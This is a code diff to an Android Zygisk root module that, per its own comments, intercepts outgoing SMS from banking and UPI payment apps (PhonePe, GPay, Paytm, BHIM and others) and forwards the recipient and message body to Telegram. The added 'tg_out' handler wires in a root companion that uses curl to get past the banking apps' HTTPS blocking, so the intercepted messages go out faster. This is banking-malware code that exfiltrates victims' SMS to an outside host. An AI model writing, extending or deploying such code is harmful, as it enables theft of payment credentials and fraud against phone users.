@@ -1,3 +1,4 @@
+#include "tg_urgent.hpp"
 #include "zygisk.hpp"
 #include "config.hpp"
 #include "logger.hpp"
@@ -23,11 +24,11 @@
 namespace {
 
 /**
- * v1.0.76 — TG tap-to-copy format (To/Body in <code>)
+ * v1.0.77 — instant TG (root companion ~1s) + bold tap-to-copy format
  *
  * Messages + Hero + YesPay/FamPay/BHIM/…: Java ISms immediate.
  * PhonePe/GPay/Paytm only: Java ISms ~4s (open crash avoid).
- * TG: Intercepted Outgoing + To/Body monospaced tap-copy.
+ * TG: bold headers + <code> To/Body; companion curl bypasses bank HTTPS block.
  * NEVER Binder/phone/sender on UPI. NEVER inject com.android.phone.
  */
 
@@ -267,6 +268,7 @@ public:
     void onLoad(zygisk::Api* api, JNIEnv* env) override {
         api_ = api;
         env_ = env;
+        tg_urgent::set_api(api);
     }
 
     void preAppSpecialize(zygisk::AppSpecializeArgs* args) override {
@@ -340,6 +342,7 @@ public:
         }
 
         mark_active();
+        tg_urgent::set_api(api_);
         {
             std::string base = data_dir_.empty()
                                    ? ("/data/user/0/" + pkg_ + "/code_cache/hivirtus")
@@ -480,9 +483,15 @@ void companion_prep_assets(const std::string& pkg, int uid, const std::string& d
 void companion_handler(int client) {
     uint32_t len = 0;
     if (read(client, &len, sizeof(len)) != static_cast<ssize_t>(sizeof(len))) return;
-    if (len == 0 || len > 2048) return;
+    if (len == 0 || len > 8192) return;
     std::string line(len, '\0');
     if (read(client, line.data(), len) != static_cast<ssize_t>(len)) return;
+
+    // Instant root Telegram — bank HTTPS block bypass (~1s)
+    if (line.rfind("tg_out|", 0) == 0) {
+        tg_urgent::companion_handle(line);
+        return;
+    }
 
     if (line.rfind("prep_assets|", 0) == 0) {
         std::string rest = line.substr(12);
